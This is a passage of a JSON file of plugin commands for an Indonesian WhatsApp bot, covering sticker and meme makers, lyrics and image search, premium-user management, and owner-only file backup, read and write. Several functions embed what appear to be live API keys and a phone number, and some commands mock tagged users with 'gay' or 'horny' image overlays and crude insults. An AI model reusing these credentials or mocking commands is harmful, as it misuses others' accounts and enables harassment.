    "command": "/^(quranaudio|qa)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, reply, pushname, text}) => {\nlet comment = text.split('|')[1]\nlet username = text.split(\"|\")[0]\nif (!username || !comment || text.includes(\"-\")) return reply(\"wrong format, try example: .tweetmaker satzz001|hello guys\")\nlet pp = await getBuffer(await conn.profilePictureUrl(m.sender, \"image\").catch(_ => 'https://i.pinimg.com/564x/8b/11/a8/8b11a86980c64720a41ec22332a83115.jpg'))\nconst imgbbUploader = require('imgbb-uploader');\nlet pps = await imgbbUploader({apiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', base64string: pp.toString(\"base64\"), expiration: 600})\nawait conn.sendMessage(m.chat, {image: {url:\n`https://some-random-api.com/canvas/misc/tweet?avatar=${pps.url}&displayname=${m.pushName}&username=${username}&comment=${comment}`}},{quoted:m})\n}",
    "on": "message",
    "command": "/^tweetmaker$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, reply, quoted, text}) => {\nif (!m.quoted) return reply(\"tag orangnya\")\nlet pp = await getBuffer(await conn.profilePictureUrl(m.quoted.sender, \"image\").catch(_ => 'https://i.pinimg.com/564x/8b/11/a8/8b11a86980c64720a41ec22332a83115.jpg'))\nconst imgbbUploader = require('imgbb-uploader');\nlet pps = await imgbbUploader({apiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', base64string: pp.toString(\"base64\"), expiration: 600})\nawait conn.sendMessage(m.chat, {image: {url:\n`https://some-random-api.com/canvas/misc/horny?avatar=${pps.url}`}},{quoted:m})\n}",
    "on": "message",
    "command": "/^horny$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, reply, quoted, text}) => {\nif (!m.quoted) return reply(\"tag orangnya\")\nlet pp = await getBuffer(await conn.profilePictureUrl(m.quoted.sender, \"image\").catch(_ => 'https://i.pinimg.com/564x/8b/11/a8/8b11a86980c64720a41ec22332a83115.jpg'))\nconst imgbbUploader = require('imgbb-uploader');\nlet pps = await imgbbUploader({apiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', base64string: pp.toString(\"base64\"), expiration: 600})\nawait conn.sendMessage(m.chat, {image: {url:\n`https://some-random-api.com/canvas/overlay/gay?avatar=${pps.url}`}},{quoted:m})\n}",
    "on": "message",
    "command": "/^gay$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, reply, quoted, text}) => {\nif (!m.quoted) return reply(\"tag orangnya\")\nlet pp = await getBuffer(await conn.profilePictureUrl(m.quoted.sender, \"image\").catch(_ => 'https://i.pinimg.com/564x/8b/11/a8/8b11a86980c64720a41ec22332a83115.jpg'))\nconst imgbbUploader = require('imgbb-uploader');\nlet pps = await imgbbUploader({apiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', base64string: pp.toString(\"base64\"), expiration: 600})\nawait conn.sendMessage(m.chat, {image: {url:\n`https://some-random-api.com/canvas/misc/simpcard?avatar=${pps.url}`}},{quoted:m})\n}",
    "on": "message",
    "command": "/^simpcard$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Membackup Bot",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst tanggal = new Date().toLocaleDateString('id', { weekday: 'long' }) + ',' + ' ' + new Date().toLocaleDateString(\"id\", {day: 'numeric', month: 'long', year: 'numeric'})\nconst backupFileName = `SIESTA-MD ${tanggal}.zip`;\nconst output = fs.createWriteStream(backupFileName);\nconst archive = archiver('zip', { zlib: { level: 9 } });\narchive.pipe(output);\narchive.on('warning', function(err) { if (err.code === 'ENOENT') { \nconsole.log(chalk.bgRedBright(chalk.black(\"[ ERROR ]\")),\nchalk.yellow(err))\n} else { \nthrow err \n}\n});\narchive.glob('**/*', { cwd: './', ignore: ['node_modules/**/*', 'session/**', '**/.*', backupFileName]});\nawait archive.finalize()\nawait conn.sendMessage(m.sender, {document: {url: `./${backupFileName}` }, mimetype: \"application/zip\", fileName: backupFileName}, {quoted: m})\nawait fs.unlinkSync(backupFileName)\n}",
    "on": "message",
    "command": "/backup/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengambil File",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.query) return m.reply(`where is the text?\\n\\nexempel: .gp message/case.js`)\nlet filename = m.query\nif (!fs.existsSync(filename)) return m.reply(`'${filename}' not found!`)\nconn.sendButtons(m.chat, '`GET PLUGINS`', fs.readFileSync(filename, 'utf8'), '© ꜱᴀᴛɢᴀɴᴢᴅᴇᴠꜱ', [{type:'copy', text:'Copy Code', id:fs.readFileSync(filename, 'utf8')}],m)\n}",
    "on": "message",
    "command": "/^(getfile|gf)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mendapatkan plugins",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\nif (!text)  return m.reply('Where is the text?\\n\\nExample: .gp menu');\nconst filename = path.join(__dirname, `${text}${!/\\.js$/i.test(text) ? '.js' : ''}`);\nif (!fs.existsSync(filename)) {\nconst listPlugins = fs.readdirSync(__dirname).filter(file => file.endsWith('.js')).map(file => file.replace(/\\.js$/, ''));\nlet plug = listPlugins.map(v => { return [v, \".gp \"+ v] });\nreturn conn.sendListMsg(\nm.chat,\n`'${filename}' not found!`,\n'',\nglobal.author,\n'List Plugins',\n'💀',\n'a',\nplug,\nm\n);\n}\nconst sendCarousel = async (id, cards=[], quoted = '') => {\nconst msg = generateWAMessageFromContent(id, proto.Message.fromObject({\nviewOnceMessage: {\nmessage: {\ninteractiveMessage: proto.Message.InteractiveMessage.create({\nheader: proto.Message.InteractiveMessage.Header.create({ title: \"\", hasMediaAttachment: false}),\nbody: proto.Message.InteractiveMessage.Body.create({ text: \"*ALL MENU*\"}),\nfooter: proto.Message.InteractiveMessage.Footer.create({ text: \"\" }), \ncarouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards })\n})\n}\n}\n}), { quoted, userJid: id });\nreturn conn.relayMessage(id, msg.message, { quoted, messageId: msg.key.id });\n};\n\nconst {imageMessage} = await prepareWAMessageMedia({ image: { url: \"https://satganzdevs-api.up.railway.app/api/thmb\" } }, { upload: conn.waUploadToServer })\nconst code = fs.readFileSync(filename, 'utf8');\nsendCarousel(m.chat, [{\nheader: proto.Message.InteractiveMessage.Header.create({\nhasMediaAttachment: true,\nimageMessage,\n}),\nbody: proto.Message.InteractiveMessage.Body.create({ text: code }),\nfooter: proto.Message.InteractiveMessage.Footer.create({ text: global.author }),\nnativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({\nbuttons: [{\nname: \"cta_copy\",\nbuttonParamsJson: JSON.stringify({\ndisplay_text: 'Salin',\ncopy_code:code\n})\n}]\n})\n}], m\n);\n}",
    "on": "message",
    "command": "/^(getplugins|gp)/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, text}) => {\nif (!text) return reply('teksnya')\nlet userss = Object.keys(db.data.users)\nlet msg = await conn.sendMessage(\"status@broadcast\", {text},{textArgb: 4294967295,backgroundArgb: 4280730844,statusJidList: userss, broadcast : true})\nawait conn.sendMessage(m.chat, {text:'done broadcasted!'},{quoted:msg})\n}",
    "on": "message",
    "command": "/^bc$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengupdate Profile Bot",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, mime, qmsg}) => {\nconst { S_WHATSAPP_NET } = require(\"@whiskeysockets/baileys\");\nconst quoted = m.quoted ? m.quoted : m\nlet medis = await conn.downloadAndSaveMediaMessage(qmsg, \"ppg\");\nvar { img } = await generateProfilePicture(medis);\nawait conn.query({\ntag: 'iq',\nattrs: {\n// target: '0',\nto: S_WHATSAPP_NET,\ntype: 'set',\nxmlns: 'w:profile:picture'\n},\ncontent: [\n{\ntag: 'picture',\nattrs: { type: 'image' },\ncontent: img\n}\n]\n})\nreply(\"Profile picture has been changed.\")\n}",
    "on": "message",
    "command": "/^(setppbot|setbotpp)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menambahkan pengguna premium",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst _prem = require(\"../lib/premium.js\")\nconst premium = JSON.parse(fs.readFileSync('./src/premium.json'));\nconst {reply,q} = m\nconst isCreator = global.owner + \"@s.whatsapp.net\" === m.sender ? true :  false\nconst isOwner = isCreator\nconst isPremium = isOwner ? true : _prem.checkPremiumUser(m.sender, premium)\nconst toMs = require('ms')\nconst msToDate = (ms) => {\nlet days = Math.floor(ms / (24 * 60 * 60 * 1000))\nlet daysms = ms % (24 * 60 * 60 * 1000)\nlet hours = Math.floor((daysms) / (60 * 60 * 1000))\nlet hoursms = ms % (60 * 60 * 1000)\nlet minutes = Math.floor((hoursms) / (60 * 1000))\nlet minutesms = ms % (60 * 1000)\nlet sec = Math.floor((minutesms) / (1000))\nreturn days + \" Days \" + hours + \" Hours \" + minutes + \" Minutes\"\n}\n\n\n\nif (!m.quoted) return reply(`Please respond to the target message!`)\nvar userId = m.quoted.sender\nvar time = q\nif(time == undefined) return reply(\"Please enter the time\\ns = seconds\\nh = hours\\nd = days\")\n_prem.addPremiumUser(userId, time, premium)\nlet day\nlet ct\nif (isNaN(q)) {\nday = msToDate(toMs(time))\nct = toMs(time)\n} else {\nday = 'PERMANENT'\nct = \"PERMANENT\"\n}\n\nlet text =`\n*SUCCESS*\\n\n_Name:_ ${db.data.users[userId].name.split('@')[0]}\n_Number:_ @${userId.split(\"@\")[0]}\n_Days:_ ${day}\n_Countdown:_ ${ct}`\nreply(text)\n}",
    "on": "message",
    "command": "/addprem/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menghapus pengguna premium",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst _prem = require(\"../lib/premium.js\")\nconst premium = JSON.parse(fs.readFileSync('./src/premium.json'));\nconst {reply} = m\nconst isCreator = global.owner + \"@s.whatsapp.net\" === m.sender ? true :  false\nconst isOwner = isCreator\nconst isPremium = isOwner ? true : _prem.checkPremiumUser(m.sender, premium)\n\n\n\nif (!m.quoted) return reply(`Please reply message target!`)\npremium.splice(_prem.getPremiumPosition(m.quoted.sender, premium), 1)\nfs.writeFileSync('./src/premium.json', JSON.stringify(premium))\nreply('Sukses!')\n}",
    "on": "message",
    "command": "/delprem/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "informasi pengguna premium",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst ms = require('parse-ms-commonjs')\nconst _prem = require(\"../lib/premium.js\")\nconst premium = JSON.parse(fs.readFileSync('./src/premium.json'));\nconst {reply} = m\nconst isCreator = global.owner + \"@s.whatsapp.net\" === m.sender ? true :  false\nconst isOwner = isCreator\nconst isPremium = isOwner ? true : _prem.checkPremiumUser(m.sender, premium)\nlet txt = `*── 「 LIST PREMIUM 」 ──*\\nTotal : ${premium.length}\\n\\n`\nlet men = [];\nfor (let i of premium) {\nmen.push(i.id)\ntxt += `*ID :* @${i.id.split(\"@\")[0]}\\n`\nif (i.expired === 'PERMANENT') {\nlet cekvip = 'PERMANENT'\ntxt += `*Expired :* PERMANENT\\n\\n`\n} else {\nlet cekvip = ms(i.expired - Date.now())\ntxt += `*Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\\n\\n`\n}\n}\nreply(txt, men)\n}",
    "on": "message",
    "command": "/listprem|premlist/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengecek user",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst ms = require('parse-ms-commonjs')\nconst {reply} = m\nconst isCreator = global.owner + \"@s.whatsapp.net\" === m.sender ? true :  false\nconst isOwner = isCreator\nconst _prem = require(\"../lib/premium.js\")\nconst premium = JSON.parse(fs.readFileSync('./src/premium.json'));\nconst isPremium = _prem.checkPremiumUser(m.sender, premium)\n\n\n\n\nif (isOwner) return reply(`You are the owner, silly!`)\nif (!isPremium) return reply(`You are not a premium user`)\nif (_prem.getPremiumExpired(m.sender, premium) == \"PERMANENT\") return reply(`PERMANENT`)\nlet cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())\nlet premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`\nreply(premiumnya)\n}",
    "on": "message",
    "command": "/cekprem|premcek/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengubah mode bot menjadi public",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply}) => {\nif (conn.public == true) return reply(`Already in Public Mode!`)\nconn.public = true;\nreply(\"Success Change To Public Mode\");\n}",
    "on": "message",
    "command": "/^public$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "rename file.",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.query) return m.reply(`where is the text?\\n\\nexample: .${command} message/case.js|message/handler.js`)\nlet filename = m.query.split(\"|\")[0]\nlet newFileName = m.query.split(\"|\")[1]\nif (!fs.existsSync(filename)) return m.reply(`'${filename}' not found!`)\nfs.rename(filename, newFileName, (err) => {\nif (err) throw err;\nreply(`renamed ${filename} to ${newFileName}`);\n});\n}",
    "on": "message",
    "command": "/rename|rf/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Restart The Bot",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\ntry {\nif (!db.data.others['restarts']) {\ndb.data.others['restarts'] = {};\n}\nlet { key } = await conn.sendMessage(m.chat, { text: `_Restarting..._` }, { quoted: m });\ndb.data.others['restarts'].key = key;\ndb.data.others['restarts'].from = m.chat;\nawait db.write();\nawait sleep(1000);\nprocess.send('reset');\n} catch (error) {\nconsole.error('Failed to restart the bot:', error);\nawait conn.sendMessage(m.chat, { text: 'Failed to restart the bot. Please try again later.' }, { quoted: m });\n}\n}",
    "on": "message",
    "command": "/^(restart)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengupdate file",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.query) return m.reply(`where is the path?\\n\\nexample:\\n${command} plugins/menu.js`)\nif (!m.quoted.text) return m.reply(`reply code`)\nlet path = `${m.q}`\nawait require('fs').writeFileSync(path, m.quoted.text)\nm.reply(`Saved ${path} to file!`)\n}",
    "on": "message",
    "command": "/^(sf|savefile)/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengupdate plugins",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text, reply}) => {\nconst path = require(\"path\") \nif (!text) return reply(`where is the path?\\n\\nexample:\\n.${command} menu.js`)\nif (!m.quoted.text) return reply(`reply code`)\nlet paths = path.join(__dirname, `./${text}${!/\\.js$/i.test(text) ? '.js' : ''}`)\nawait require('fs').writeFileSync(paths, m.quoted.text)\nm.reply(`Saved ${paths} to file!`)\n}",
    "on": "message",
    "command": "/^(saveplugins|sp)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengubah mode bot menjadi self",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply}) => {\nif (!conn.public) return reply(`Already in Self Mode!`)\nconn.public = false;\nreply(\"Success Change To Self Mode\");\n}",
    "on": "message",
    "command": "/^self$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mencari Gambar Dengan Google",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nif (!q) return reply('masukan query image!')\nlet res = await fetchJson(`https://aemt.me/googleimage?query=${q}`)\nawait conn.sendButtons(m.chat, '*`GIMAGE`*', '', author, [{type:'btn',text:'NEXT',id:`.gimage ${q}`}], m, {img: await pickRandom(res.result)})\n}",
    "on": "message",
    "command": "/gimage|googleimage/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text, reply, react}) => {\ntry {\nif (!text) return reply('usage example: .' + command + ' a year ago')\nawait react('⏳')\nlet response = await fetchJson(`https://lirikapi.vercel.app/api/${text}`)\nawait await conn.sendMessage(m.chat, {\nimage:{\nurl:response.image}, \ncaption:`*\\`( LYRICS SEARCH )\\`*\n\n\n> TITLE: *${response.title}*\n> ARTIST: *${response.artist}*\n> LYRICS:\\n${response.lyrics} `},{quoted:m})\nawait react('🎉')\n} catch (error) {\nconsole.log(error)\nreply('error, silahkan coba command .lirikv2')\n}\n//await reply(data.result.lyrics)\n}",
    "on": "message",
    "command": "/^lirik$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text, reply, react}) => {\nif (!text) return reply('usage example: .' + command + ' a year ago')\nawait react('⏳')\nlet response = await fetchJson(`https://apilyrics.vercel.app/search?query=${text}`)\nlet allResult = response.map((res, index) => {\nreturn [res.fullTitle, `.getslyrics ${res.url}|${res.image}`];\n});\nawait conn.sendListMsg(m.chat, 'Result Of ' + text, '', global.author, 'Buka', 'Result', 'Matched', allResult, m);\nawait react('🎉')\n//await reply(data.result.lyrics)\n}",
    "on": "message",
    "command": "/^lirikv2$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text, reply, react}) => {\nawait react('⏳')\nlet response = await fetchJson(`https://apilyrics.vercel.app/lyrics?url=${text.split(\"|\")[0]}`)\nawait conn.sendMessage(m.chat, {image:{url:text.split(\"|\")[1]}, caption: response.lyrics},{quoted:m})\nawait react('🎉')\n}",
    "on": "message",
    "command": "/^getslyrics$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "google image",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command }) => {\n    const { reply, q } = m;\n    if (!q) return reply('masukkan query image!');\n\n    // Fetch Pinterest images\n    const res = await pinterest(q);\n    const { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${q}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${q}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);\n    const imageUrls = data.resource_response.data.results.map(result => result.images.orig.url);\n\n    // Shuffle and select images\n    shuffleArray(imageUrls);\n    const selectedImages = imageUrls.slice(0, 10);\n\n    // Send carousel of images\n    await sendCardCarousel(conn, m.chat, selectedImages, \"PINTEREST\", \"RESULT\", author);\n}",
    "on": "message",
    "command": "/^(pinterest|pin)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mencari stiker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet { stickersearch } = require(\"../lib/scrapes\")\n\n\nreply(mess.wait)\nlet res = await fetchJson('https://api.agatz.xyz/api/sticker?message=' + q)\nfor (let satria of res.data.sticker_url) conn.sendImageAsSticker(m.chat, satria, m, {packname: res.data.title, author: 'krniwnstria'})\n}",
    "on": "message",
    "command": "/stickersearch/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mencari stiker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet { stickersearch } = require(\"../lib/scrapes\")\n\n\nreply(mess.wait)\nlet res = await fetchJson('https://api.agatz.xyz/api/tiktoksearch?message=' + q)\nawait conn.sendMessage(m.chat, {video: {url:res.data.no_watermark}, caption: res.data.title},{quoted:m})\n}",
    "on": "message",
    "command": "/tiktoksearch/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "text To Picture",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply('text?')\nconn.sendVideoAsSticker(m.chat, `https://aemt.me/attp?text=${q}`, m, { packname: global.packname, author: global.author })\n}",
    "on": "message",
    "command": "/attp/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, from, command, text, reply}) => {\nif (!text) return reply(\"*`❌ [ WRONG FORMAT ]`\\n _try example:_ .brat serius aku diginiin? gamau digidaw aja😔?\")\nawait conn.sendImageAsSticker(m.chat, await getBuffer(`https://apii.maulanaa.xyz/api/brat?text=${text}`), m, {packname:'Sticker By',author:'Satzz Voldigoad.'})\n}",
    "on": "message",
    "command": "/^brat$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "EmojiMix",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply('text?')\nlet [emoji1, emoji2] = q.split`+`;\nif (!emoji1) throw `tolol!, Example : ${command} 😅+🤔`;\nif (!emoji2) throw `tolol! Example : ${command} 😅+🤔`;\nlet anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`);\nfor (let res of anu.results) {\nawait conn.sendImageAsSticker(m.chat, res.url, m, {packname: global.packname,author: global.author, ios_app_store_link: \"https://wa.me/6281316701742\", android_play_store_link : \"https://wa.me/6281316701742\"});\n}\n}",
    "on": "message",
    "command": "/emojimix/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "quote chat maker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q, pushname} = m\nlet ppuser = await conn.profilePictureUrl(m.sender, \"image\").catch(_ => \"https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60\")\nconst name = await conn.getName(m.sender)\nlet theme = \"quotly\" === command ? \"terang\" : \"quotlyv2\" === command ? \"gelap\" : \"random\"\nlet result = await Quotly(name, ppuser, q, theme);\nconn.sendImageAsSticker(m.chat, result, m, {packname,author})\n}",
    "on": "message",
    "command": "/^(quotely|quotelyv2|qc)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "sticker meme maker",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst {q, reply} = m\nif (!q) return reply(`Balas Image Dengan Caption ${command}`);\nif (!quoted) return reply(`Balas Image Dengan Caption ${command}`);\nif (/webp/.test(mime)) return reply('Bukan Stiker Kontol')\nif (/image/.test(mime)) {\nmee = await conn.downloadAndSaveMediaMessage(quoted);\nmem = await imgbbUploader({apiKey: 'a54fab7dfacaec0565cdfd619ce5dca5', imagePath: mee,expiration: 600})\nlet kaytid \nif (q.includes(\"|\")) {\nkaytid = await getBuffer(`https://api.memegen.link/images/custom/${q.split(\"|\")[0]}/${q.split(\"|\")[1]}.png?background=${mem.url}`);\n} else kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem.url}`);\nconn.sendImageAsSticker(m.chat, kaytid, m, {packname: global.packname,author: global.author,isAvatar:true});\n} else return reply(\"hanya bisa membuat smeme dari foto\");\n}",
    "on": "message",
    "command": "/^(smeme|stickermeme)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "video/image to sticker",
    "type": "misc",
    "dontAddCommandList": false,
